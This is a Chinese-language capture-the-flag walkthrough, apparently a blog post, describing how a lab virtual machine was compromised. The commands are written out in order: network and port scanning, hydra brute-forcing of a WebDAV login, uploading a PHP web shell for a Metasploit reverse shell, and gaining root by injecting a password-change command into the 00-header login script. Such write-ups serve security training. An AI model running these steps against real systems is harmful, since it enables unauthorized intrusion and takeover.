kali地址：192.168.124.21

靶机地址：192.168.124.25

扫描存活主机ip：arp-scan 192.168.124.0/24

![](https://image.3001.net/images/20201008/1602164400_5f7f16b02b4d49246c292.png!small)扫描主机开放端口：nmap
192.168.124.25 -p 1-65535

发现开放80端口和22端口，猜测可进行ssh爆破

![](https://image.3001.net/images/20201008/1602164487_5f7f17071fde13bf9677f.png!small)

访问80端口：查看网页内容

![](https://image.3001.net/images/20201008/1602164528_5f7f1730994e7c35d94c5.png!small)使用cewl生成字典：cewl
192.168.124.25 -w 123.txt

![](https://image.3001.net/images/20201008/1602164609_5f7f178120c5aa9e37ef6.png!small)进行目录扫描：dirb
<http://192.168.124.25>/usr/share/wordlists/dirb/big.txt

发现webdav路径，webdav是一种基于 HTTP 1.1协议的通信协议

![](https://image.3001.net/images/20201008/1602164651_5f7f17abe7465d5cd2b64.png!small)

对该目录进行爆破：hydra -L 用户名字典 -P 密码字典 http-get /webdav

成功爆破：用户名：yamdoot 密码：Swarg

![](https://image.3001.net/images/20201008/1602165043_5f7f1933545f37c054134.png!small)

访问webdav，输入用户名密码登录成功：可进行文件上传（此处已上传shell.php文件）

![](https://image.3001.net/images/20201008/1602164876_5f7f188c1667910fbea25.png!small)上传shell.php文件：cadaver
http://192.168.124.25/webdav/

![](https://image.3001.net/images/20201008/1602164942_5f7f18ce86ef4d700be72.png!small)使用msf反弹shell：反弹成功

获取交互式shell：python3 -c 'import pty;pty.spawn("/bin/bash")'

![](https://image.3001.net/images/20201008/1602165309_5f7f1a3da17c7e34c2237.png!small)浏览文件发现hell.sh文件，查看后发现神秘代码，破解后得到密码：chitragupt

并发现三个用户

![](https://image.3001.net/images/20201008/1602165407_5f7f1a9f67645b8c92252.png!small)对inferno用户进行ssh登录，登录成功。查看user.txt找到第一个Flag，但并非root权限

![](https://image.3001.net/images/20201008/1602165503_5f7f1affd07c4f860e1fa.png!small)浏览文件内容时发现00-header配置文件，修改root密码：echo
"echo 'root:admin' | sudo chpasswd" >> 00-header

![](https://image.3001.net/images/20201008/1602165606_5f7f1b6625ed022e1da45.png!small)重新登录inferno用户，su
root输入新密码。提权成功，找到Root Flag！

![](https://image.3001.net/images/20201008/1602165807_5f7f1c2f7ad8f106d510e.png!small)

总结：渗透的本质就是信息收集！Information Gathering永远滴神！

